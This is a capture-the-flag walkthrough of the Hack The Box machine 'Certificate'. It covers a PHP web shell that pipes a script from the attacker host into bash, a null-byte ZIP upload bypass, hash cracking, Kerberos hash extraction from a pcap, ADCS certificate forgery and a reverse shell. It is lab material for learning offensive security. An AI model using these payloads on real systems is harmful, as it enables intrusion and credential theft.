---
title: Certificate
layout: post
released: 2025-05-31
creators:
  - Spectra199
pwned: true
tags:
  - os/windows
  - diff/hard
category:
  - HTB
description: Certificate is running a website on getting certifications. If we register as a student and enrol in a course we can upload a file. There's some filters in place but by using a nullbyte bypass we can get a shell. We can find database credentials in which contains the hash for Sara.b. Sara has a pcap file in her desktop, with a description that notes failure to find a share. We can find AS-REQ packets which we can use to recreate a krb5-18 hash for Lion.SK which is crackable. Lion.SK is a member of a group that can issue and revoke certificates. We grab a certificate for Lion.SK using which we grab a certificate for Ryan.K. Ryan.K has the privilege SeManageVolumePrivilege which allows us to escalate to root.
image: https://labs.hackthebox.com/storage/avatars/9b765f2f3e0b0c8d115b5455c22101cf.png
cssclasses:
  - custom_htb
---
![Certificate Icon](https://labs.hackthebox.com/storage/avatars/9b765f2f3e0b0c8d115b5455c22101cf.png)

# Information Gathering
## Scans
As usual we start of with an `nmap` scan.
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49688/tcp open  unknown
49706/tcp open  unknown
49720/tcp open  unknown
49735/tcp open  unknown
```
The most interesting port seems to be `80 - http` so let's take a closer look.
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Certificate | Your portal for certification
Service Info: Host: certificate.htb
```
# Foothold
Looking at the `http` website we can find a `certificate training` website.
![Certificate Training](/assets/img/img_Certificate/Certificate-1748732715931.png)
Looking around we can see that we can `register` an account, we can also choose to register a `teacher` account, however we must contact support to validate our account.
![Certificate Account Register](/assets/img/img_Certificate/Certificate-1748733108620.png)
Let's first register as a `student` and `login`. Taking a look around we can go to `courses` and `enrol` into any one of these courses. 
![Course](/assets/img/img_Certificate/Certificate-1748734206106.png)
If we enrol onto a course we can see a success message, scrolling down reveals the course-outline.
![Course Outline](/assets/img/img_Certificate/Certificate-1748734286098.png)
The `Watch` button does nothing but the `Submit` button leads us to `/uploads.php` with a parameter of `s_id=4x` where `x` seems to be the quiz number.
![Upload](/assets/img/img_Certificate/Certificate-1748734381319.png)
When we click `submit` we're greeted with an upload form that mentions the file types `pdf,docx,pptx,xlsx,zip`.

So let's write ourselves a `php` shell.
```php
<?php system("curl http://10.10.14.158:3232/comp.sh | bash")?>
```

Next let's put it in a `zip` file.
```bash
zip shell.zip shell.php
  adding: shell.php (deflated 1%)
```

After which, if we upload it we get the following.
![Invalid Extension](/assets/img/img_Certificate/Certificate-1748734673591.png)

This suggests to me that there's some kind of filtering going on, let's try to zip a `pdf` and upload it.

```bash
touch test.pdf
zip test.zip test.pdf
	adding: test.pdf (stored 0%)
```

We can see that we can submit this `zip` file with a `pdf` inside it.
![Test PDF Upload success](/assets/img/img_Certificate/Certificate-1748734922889.png)

Clicking on the `HERE` button to check our upload we can see that it does `unzip` the `zip` file because it redirects us to view the `pdf`.

```
http://certificate.htb/static/uploads/6144021521507642c5a799e2bca164e3/test.pdf
```

If we write a null byte after the first extension and add `.pdf` we might get it to work.

```python
import zipfile
import os

# Paths
zip_path = 'w1ldshell.zip'
new_zip_path = 'w1ldshell2.zip'
old_filename = 'w1ldshell.php'
new_filename = 'w1ldshell.php\x00.pdf'
payload = '<?php system($_GET["cmd"])?>'

# Create the original ZIP file
with zipfile.ZipFile(zip_path, 'w') as zip_create:
    zip_create.writestr(old_filename, payload)
print(f'Created original ZIP file: {zip_path} with {old_filename}')

# Open the original ZIP and create a new one with the renamed file
with zipfile.ZipFile(zip_path, 'r') as zip_read:
    with zipfile.ZipFile(new_zip_path, 'w') as zip_write:
        for item in zip_read.infolist():
            original_data = zip_read.read(item.filename)
            # Rename the target file
            if item.filename == old_filename:
                item.filename = new_filename
            zip_write.writestr(item, original_data)

print(f'Renamed {old_filename} to {new_filename} inside {new_zip_path}')

```

We can see that the file `w1ldshell2.php` is uploaded successfully!
![webshell upload](/assets/img/img_Certificate/Certificate-1748740405131.png)

Let's now visit the link we're given, remove the ` .pdf` extension at the end and specify a `cmd` parameter.

![webshell](/assets/img/img_Certificate/Certificate-1748740458583.png)

Success! We have a web shell as `xamppuser`!

Use a reverse shell of your choice.

> When choosing a rev shell keep in mind that the OS is Windows. I got burned forgetting this a couple times since Windows doesn't usually have web.
{:.warning}

# User

Taking a look around we can find `db.php` in the current directory.

```php
<?php 
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = '[REDACTED]'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

We can see the following credentials: `certificate_webapp_user`:`[REDACTED]`

Since we know we have `xampp` installed let's use `mysql.exe` in `C:\xampp\mysql\bin` and let's take a look at the database

```powershell
PS C:\xampp\mysql\bin> ./mysql.exe --host=localhost --user=certificate_webapp_user --password="[REDACTED]" --database=Certificate_WEBAPP_DB
Welcome to the MariaDB monitor.  Commands end with ; or \g. 
Your MariaDB connection id is 68
Server version: 10.4.32-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [Certificate_WEBAPP_DB]>
```

We can find a users table and their hashes.
```
MariaDB [Certificate_WEBAPP_DB]> select username,password from users; 
 Lorra.AAA | $2y$04$[REDACTED]
 Sara1200  | $2y$04$[REDACTED]
 Johney    | $2y$04$[REDACTED]
 havokww   | $2y$04$[REDACTED]
 stev      | $2y$04$[REDACTED]
 sara.b    | $2y$04$[REDACTED]
 w1ld      | $2y$04$[REDACTED]
```

Let's try and crack these passwords with `hashcat`.
```bash
hashcat -a 0 passwords.pem -m 3200 /usr/share/wordlists/rockyou.txt --username
```

After a while we get a password cracked!
```
sara.b:[REDACTED]:[REDACTED]
```

We get the following credentials: `sara.b`:`[REDACTED]`

Looking around we can find a `pcap` file.
```powershell
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap

```

Let's take a look at `Description.txt`
```
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Using the `BPF` of `smb2.cmd == 0x01` we can find a lot of requests.
![Session setup](/assets/img/img_Certificate/Certificate-1748749435203.png)

If we keep looking there's a lot of Logon Failures followed by a success.
![Successful Session Setup Response](/assets/img/img_Certificate/Certificate-1748749494361.png)

Looking further it looks like the authentication method is `Kerberos` so let's look for that.
![Kerberos auth](/assets/img/img_Certificate/Certificate-1748750259803.png)

We can see multiple `kerberos` requests
![Kerberos requests](/assets/img/img_Certificate/Certificate-1748750286743.png)

We can use a method shown in another box as demonstrated by [0xdf](https://0xdf.gitlab.io/2024/06/22/htb-office.html#latest-system-dump-8fbc124dpcap) and [OpCode](https://gitlab.com/0pcode/htb-scribbles/-/blob/main/Boxes/Office/README.md#password-from-kerberos-pre-authentication-packets) to extract a hash from a `kerberos packet capture`

We should get the following hash:
```
lion.sk:$krb5pa$18$Lion.SK$CERTIFICATE.HTB$CERTIFICATE.HTBLion.SK$23[REDACTED]
```

Cracking it using `john` we get a password!
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt lion.sk.pem
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (lion.sk)     
1g 0:00:00:01 DONE (2025-06-01 00:26) 0.5291g/s 7585p/s 7585c/s 7585C/s goodman..cherry13
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have the following credentials! `Lion.SK`:`!QAZ2wsx`

Let's remote in using `evil-winrm`
```powershell
evil-winrm -i certificate.htb -u Lion.SK -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents>
```

Just like that, we have User!
# Root
`Lion.SK` is a member of `Domain CRA Managers`
![Domain CRA Managers](/assets/img/img_Certificate/Certificate-1748752408132.png)
According to the description of `Domain CRA Managers`.

> The members of this security group are responsible for issuing and revoking multiple certificates for the domain users

So Let's look for vulnerable certificate templates.
```
certipy-ad find -u lion.sk@certificate.htb -p '!QAZ2wsx' -target dc01.certificate.htb -dc-ip 10.129.238.176 -vulnerable 
Certipy v5.0.2 - by Oliver Lyak (ly4k)
                                                                                                                      
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'                                      
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250601003539_Certipy.txt'
[*] Wrote text output to '20250601003539_Certipy.txt'
[*] Saving JSON output to '20250601003539_Certipy.json'
[*] Wrote JSON output to '20250601003539_Certipy.json'
```

With these let's take note of the following:
`Certificate Authority` - `Certificate-LTD-CA`
`Certificate Template` - `Delegated-CRA`

Let's grab a certificate for `Lion.SK`
```bash
certipy-ad req -u "lion.sk@certificate.htb" -p '!QAZ2wsx' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.2 - by Oliver Lyak (ly4k) 
[*] Requesting certificate via RPC 
[*] Request ID is 32 
[*] Successfully requested certificate 
[*] Got certificate with UPN 'Lion.SK@certificate.htb' 
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115' 
[*] Saving certificate and private key to 'lion.sk.pfx' 
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

Next let's grab a certificate for `Ryan`, however the current template work work so let's use `SignedUsers` instead.
```bash
certipy-ad req -u lion.sk -p '!QAZ2wsx' -pfx 'lion.sk.pfx' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'certificate\ryan.k' -out 'ryan.k.pfx'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 49
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

> The reason it wouldn't work with the current template is because there's a policy preventing us from requesting the certificate without it being signed.

And let's authenticate!
```bash
certipy-ad auth -pfx ryan.k.pfx -domain certificate.htb -dc-ip 10.129.238.176
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

We can `winrm`
```powershell
evil-winrm -i certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6                                                                                                                             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```

Ryan has the following privileges.
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

The most interesting one being `SeManageVolumePrivilege`

Let's use [CsEnox's Binary](https://github.com/CsEnox/SeManageVolumeExploit) to exploit this privilege.

Let's transfer the exe over and execute it!
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ./SeManageVolumeExploit.exe
Entries changed: 845
                                                                   
DONE
```

Let's find the `Serial Number` for the `CA`'s certificate.
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store my
my "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM 
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA                    
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
================ Certificate 1 ================    
Serial Number: 5800000002ca70ea4e42f218a6000000000002 
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb 
 NotBefore: 11/3/2024 8:14 PM                                      
 NotAfter: 11/3/2025 8:14 PM                                                                                                           
Subject: CN=DC01.certificate.htb 
Certificate Template Name (Certificate Type): DomainController 
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft RSA SChannel Cryptographic Provider
Missing stored keyset

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
```

Using this let's now export the `pfx` file.
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file ca_exported.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Transfer this to our machine and let's forge an admin certificate using the `CA`'s certificate
```bash
certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@CERTIFICATE.HTB
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

Let's now attempt to authenticate via `certipy-ad auth`
```bash
certipy-ad auth -pfx administrator_forged.pfx -domain certificate.htb -dc-ip 10.129.238.176                                
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ADMINISTRATOR@CERTIFICATE.HTB'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

Just like that, we have Root!

# Beyond Root
I was really interested to know more about that `nullbyte` exploit. Looking around we can find [0xdf](https://0xdf.gitlab.io/2024/01/13/htb-zipping.html#beyond-root---unintended-footholds) did a similar thing on the `Zipping` box.

I tried to do the manual method he showed where he used a `hex editor` to edit the bytes. Editing only the second instance of the `filename` generated errors when uploaded. However, if we edited both instances, we would be able to submit the file and not have to use a sacrificial zipfile as we did in python.

## Alternative method: Zip Concatenation
One alternative found for the ZIP upload vulnerability is through concatenating two different zip files, one with a legitimate file, and another with the malicious file.

More information can be found here:

[Evasive Zip Concatenation: Trojan Targets Windows Users](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/)

I've constructed a `pdf` and `php` shell

> I was unable to get a web shell to work, I will need to investigate it further, however directly passing in our reverse shell does work.
{:.info}

**Command**
```bash
ls -la
```

**Output**
```bash
ls -la
total 104
drwxrwxr-x 2 kali kali  4096 Jun  4 06:26 .
drwxrwxr-x 4 kali kali  4096 Jun  2 07:34 ..
-rw-rw-r-- 1 kali kali 91266 Jun  4 06:13 legit.pdf
-rw-rw-r-- 1 kali kali  1370 Jun  4 06:23 w1ld.php
```

Let's start off by creating our zipfiles.

**Command**
```bash
7zz a legit.zip legit.pdf
```

**Output**
```bash
7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive:
1 file, 91266 bytes (90 KiB)

Creating archive: legit.zip

Add new data to archive: 1 file, 91266 bytes (90 KiB)

    
Files read from disk: 1
Archive size: 83614 bytes (82 KiB)
Everything is Ok
```

**Command**
```bash
7zz a w1ld.zip w1ld.php
```

**Output**
```bash
7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive:
1 file, 1370 bytes (2 KiB)

Creating archive: w1ld.zip

Add new data to archive: 1 file, 1370 bytes (2 KiB)

    
Files read from disk: 1
Archive size: 761 bytes (1 KiB)
Everything is Ok
```

We should now have 2 zip files, one with our legitimate file, and another one with a malicious payload.

**Command**
```bash
ls -la
```

**Output**
```bash
drwxrwxr-x 2 kali kali  4096 Jun  4 06:29 .
drwxrwxr-x 4 kali kali  4096 Jun  2 07:34 ..
-rw-rw-r-- 1 kali kali 91266 Jun  4 06:13 legit.pdf
-rw-rw-r-- 1 kali kali 83614 Jun  4 06:28 legit.zip
-rw-rw-r-- 1 kali kali  1370 Jun  4 06:23 w1ld.php
-rw-rw-r-- 1 kali kali   761 Jun  4 06:29 w1ld.zip
```

Now let's concatenate the zip files.

**Command**
```bash
cat legit.zip w1ld.zip > combined.zip
```

**Command**
```bash
ls -la
```

**Output**
```bash
total 276
drwxrwxr-x 2 kali kali  4096 Jun  4 06:31 .
drwxrwxr-x 4 kali kali  4096 Jun  2 07:34 ..
-rw-rw-r-- 1 kali kali 84375 Jun  4 06:31 combined.zip
-rw-rw-r-- 1 kali kali 91266 Jun  4 06:13 legit.pdf
-rw-rw-r-- 1 kali kali 83614 Jun  4 06:28 legit.zip
-rw-rw-r-- 1 kali kali  1370 Jun  4 06:23 w1ld.php
-rw-rw-r-- 1 kali kali   761 Jun  4 06:29 w1ld.zip
```

Let's upload the file.
![File upload success](/assets/img/img_Certificate/Certificate-1749033125440.png)

Let's start a listener for our reverse shell.

**Command**
```bash
nc -lvnp 9001
```

**Output**
```bash
listening on [any] 9001 ...
```

Now if we click on the link provided we'll see that the `pdf` is not found.
![PDF Not found](/assets/img/img_Certificate/Certificate-1749033184168.png)

However, if we visit our reverse shell file, we find that it gets stuck at loading.
![Stuck at Loading](/assets/img/img_Certificate/Certificate-1749033271110.png)

If we check our listener we'll see we got a call back!.
```powershell
connect to [10.10.14.158] from (UNKNOWN) [10.129.250.12] 58183

PS C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d> 
```